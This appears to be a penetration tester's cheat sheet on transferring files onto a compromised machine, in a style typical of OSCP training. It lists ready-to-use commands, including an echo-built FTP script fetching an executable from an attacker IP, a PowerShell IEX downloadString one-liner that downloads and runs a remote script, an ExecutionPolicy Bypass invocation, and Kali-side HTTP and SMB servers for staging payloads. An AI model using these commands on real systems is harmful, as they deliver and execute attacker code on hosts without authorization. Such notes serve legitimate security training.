# File Transfer

15 Ways to transfer a file
https://blog.netspi.com/15-ways-to-download-a-file/#perl

### FTP
/etc/init.d/pure-ftpd restart

Windows
FTP reverse shell
echo "open <IP>" > ftp.txt  
echo "offsec" >> ftp.txt  
echo "offsec" >> ftp.txt  
echo "bin" >> ftp.txt  
echo "get file.exe" >> ftp.txt  
echo "bye" >> ftp.txt   

ftp -s ftp.txt  

Linux
ftp -4 -d -v ftp://offsec:offsec@127.0.0.1//linuxprichecker.py < ftp upload one liner linux

### Powershell
In Kali
python -m SimpleHTTPServer 80

  Stop services   
  List PID of servies   
    ps -l   
    kill -9 PID   

#### In reverse shell - Windows

powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"

powershell full path:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe

#### Non-interactive execute powershell file

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1

### Smbsever
impacket-smbserver <share name> <path>

net view \\\\\<ip>

### SCP
After login through ssh
scp <fileToUpload> user@remote:/path
